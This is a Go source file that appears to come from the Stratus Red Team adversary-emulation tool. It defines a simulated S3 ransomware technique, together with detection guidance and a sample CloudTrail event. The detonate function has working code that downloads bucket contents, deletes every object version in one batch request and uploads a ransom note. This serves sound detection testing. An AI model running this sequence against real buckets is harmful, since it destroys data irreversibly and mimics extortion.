package aws

import (
	"context"
	_ "embed"
	"fmt"
	"github.com/aws/aws-sdk-go-v2/service/s3"
	"github.com/aws/aws-sdk-go-v2/service/s3/types"
	"github.com/datadog/stratus-red-team/v2/internal/utils"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	"strings"

	"log"
	"strconv"
)

//go:embed main.tf
var tf []byte

const RansomNoteFilename = `FILES-DELETED.txt`
const RansomNoteContents = `Your data is backed up in a safe location. To negotiate with us for recovery, get in touch with rick@astley.io. In 7 days, if we don't hear from you, that data will either be sold or published, and might no longer be recoverable.'`

const CodeBlock = "```"

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "aws.impact.s3-ransomware-batch-deletion",
		FriendlyName: "S3 Ransomware through batch file deletion",
		Description: `
Simulates S3 ransomware activity that empties a bucket through batch deletion, then uploads a ransom note.

Warm-up: 

- Create an S3 bucket, with versioning enabled
- Create a number of files in the bucket, with random content and extensions

Detonation: 

- List all available objects and their versions in the bucket
- Delete all objects in the bucket in one request, using [DeleteObjects](https://docs.aws.amazon.com/AmazonS3/latest/API/API_DeleteObjects.html)
- Upload a ransom note to the bucket

Note: The attack does not need to disable versioning, which does not protect against ransomware. This attack removes all versions of the objects in the bucket.

References:

- [The anatomy of a ransomware event targeting S3 (re:Inforce, 2022)](https://d1.awsstatic.com/events/aws-reinforce-2022/TDR431_The-anatomy-of-a-ransomware-event-targeting-data-residing-in-Amazon-S3.pdf)
- [The anatomy of ransomware event targeting data residing in Amazon S3 (AWS Security Blog)](https://aws.amazon.com/blogs/security/anatomy-of-a-ransomware-event-targeting-data-in-amazon-s3/)
- [Ransomware in the cloud](https://invictus-ir.medium.com/ransomware-in-the-cloud-7f14805bbe82)
- https://www.firemon.com/what-you-need-to-know-about-ransomware-in-aws/
- https://rhinosecuritylabs.com/aws/s3-ransomware-part-1-attack-vector/
- https://unit42.paloaltonetworks.com/large-scale-cloud-extortion-operation/
- https://unit42.paloaltonetworks.com/shinyhunters-ransomware-extortion/
`,
		Detection: `
You can detect ransomware activity by identifying abnormal patterns of objects being downloaded or deleted in the bucket. 
In general, this can be done through [CloudTrail S3 data events](https://docs.aws.amazon.com/AmazonS3/latest/userguide/cloudtrail-logging-s3-info.html#cloudtrail-object-level-tracking) (<code>DeleteObject</code>, <code>DeleteObjects</code>, <code>GetObject</code>),
[CloudWatch metrics](https://docs.aws.amazon.com/AmazonS3/latest/userguide/metrics-dimensions.html#s3-request-cloudwatch-metrics) (<code>NumberOfObjects</code>),
or [GuardDuty findings](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_finding-types-active.html) (<code>[Exfiltration:S3/AnomalousBehavior](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_finding-types-s3.html#exfiltration-s3-anomalousbehavior)</code>, <code>[Impact:S3/AnomalousBehavior.Delete](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_finding-types-s3.html#impact-s3-anomalousbehavior-delete)</code>).

Sample <code>DeleteObjects</code> event, shortened for readability:

` + CodeBlock + `json hl_lines="3 8"
{
  "eventSource": "s3.amazonaws.com",
  "eventName": "DeleteObjects",
  "eventCategory": "Data"
  "managementEvent": false,
  "readOnly": false
  "requestParameters": {
    "bucketName": "target-bucket",
    "Host": "target-bucket.s3.us-east-1.amazonaws.com",
    "delete": "",
    "x-id": "DeleteObjects"
  },
  "responseElements": null,
  "resources": [
    {
      "type": "AWS::S3::Object",
      "ARNPrefix": "arn:aws:s3:::target-bucket/"
    },
    {
      "accountId": "012345678901",
      "type": "AWS::S3::Bucket",
      "ARN": "arn:aws:s3:::target-bucket"
    }
  ],
  "eventType": "AwsApiCall",
  "recipientAccountId": "012345678901"
}
` + CodeBlock + `

Note that <code>DeleteObjects</code> does not indicate the list of files deleted, or how many files were removed (which can be up to 1'000 files per call).'
`,
		Platform:                   stratus.AWS,
		IsIdempotent:               false, // ransomware cannot be reverted :)
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Impact},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
	})
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	bucketName := params["bucket_name"]
	s3Client := s3.NewFromConfig(providers.AWS().GetConnection())

	log.Println("Simulating a ransomware attack on bucket " + bucketName)

	if err := utils.DownloadAllObjects(s3Client, bucketName); err != nil {
		return fmt.Errorf("failed to download bucket objects")
	}

	if err := removeAllObjects(s3Client, bucketName); err != nil {
		return fmt.Errorf("failed to remove objects in the bucket: %w", err)
	}

	log.Println("Uploading fake ransom note")
	if err := utils.UploadFile(s3Client, bucketName, RansomNoteFilename, strings.NewReader(RansomNoteContents)); err != nil {
		return fmt.Errorf("failed to upload ransom note to the bucket: %w", err)
	}

	return nil
}

func removeAllObjects(s3Client *s3.Client, bucketName string) error {
	objects, err := utils.ListAllObjectVersions(s3Client, bucketName)
	if err != nil {
		return fmt.Errorf("unable to list bucket objects: %w", err)
	}
	log.Println("Found " + strconv.Itoa(len(objects)) + " object versions to delete")
	log.Println("Removing all objects through a DeleteObjects batch request")
	_, err = s3Client.DeleteObjects(context.Background(), &s3.DeleteObjectsInput{
		Bucket: &bucketName,
		Delete: &types.Delete{Objects: objects},
	})
	if err != nil {
		return fmt.Errorf("unable to delete bucket objects: %w", err)
	}
	log.Println("Successfully removed all objects from the bucket")
	return nil

}
